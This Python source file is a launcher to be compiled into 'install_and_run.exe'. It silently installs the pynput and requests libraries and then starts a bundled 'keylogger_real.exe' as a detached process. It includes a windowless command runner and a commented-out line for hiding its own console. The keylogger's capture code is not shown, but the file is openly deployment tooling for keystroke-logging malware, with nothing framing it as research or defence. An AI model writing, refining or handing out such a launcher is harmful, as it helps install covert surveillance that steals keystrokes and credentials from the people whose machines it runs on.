# launcher.py   ──►  compile to install_and_run.exe  (small file)

import os
import sys
import subprocess
import shutil
import tempfile
import time

# ────────────────────────────────────────────────
#   CONFIG
# ────────────────────────────────────────────────

REAL_EXE_NAME   = "keylogger_real.exe"          # name of your big bundled exe
PACKAGES        = ["pynput", "requests"]
PIP_TIMEOUT     = 120                           # seconds

# ────────────────────────────────────────────────

def is_python_available():
    try:
        subprocess.run(["python", "--version"],
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL,
                       check=True)
        return True
    except:
        try:
            subprocess.run(["py", "--version"],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           check=True)
            return True
        except:
            return False

def run_cmd_silently(cmd):
    CREATE_NO_WINDOW = 0x08000000
    return subprocess.run(cmd, shell=True, creationflags=CREATE_NO_WINDOW,
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def install_packages():
    print("Installing required libraries...")
    print("This may take 30–120 seconds depending on internet speed.\n")

    for pkg in PACKAGES:
        print(f"→ Installing {pkg} ...")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--quiet", "--no-warn-script-location", pkg],
                timeout=PIP_TIMEOUT
            )
            print(f"   {pkg} installed.")
        except subprocess.TimeoutExpired:
            print(f"   Timeout installing {pkg}.")
            return False
        except Exception as e:
            print(f"   Failed: {e}")
            return False
    print("\nAll libraries installed.\n")
    return True

def main():
    # Hide our own console if you want (optional)
    # import ctypes; ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    this_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    real_exe = os.path.join(this_dir, REAL_EXE_NAME)

    if not os.path.isfile(real_exe):
        print(f"Error: {REAL_EXE_NAME} not found next to this launcher.")
        time.sleep(5)
        sys.exit(1)

    # Try to check if packages are importable
    try:
        import pynput
        import requests
        packages_ok = True
    except ImportError:
        packages_ok = False

    if not packages_ok:
        if not is_python_available():
            print("Python is not installed on this computer.")
            print("Cannot auto-install libraries without Python.")
            print("Please install Python from https://www.python.org first.")
            time.sleep(8)
            sys.exit(1)

        print("Required libraries not found. Installing now...\n")
        if not install_packages():
            print("\nInstallation failed. Cannot continue.")
            time.sleep(6)
            sys.exit(1)

    # Launch the real exe
    try:
        subprocess.Popen([real_exe], creationflags=subprocess.DETACHED_PROCESS)
    except Exception as e:
        print(f"Failed to start main program: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()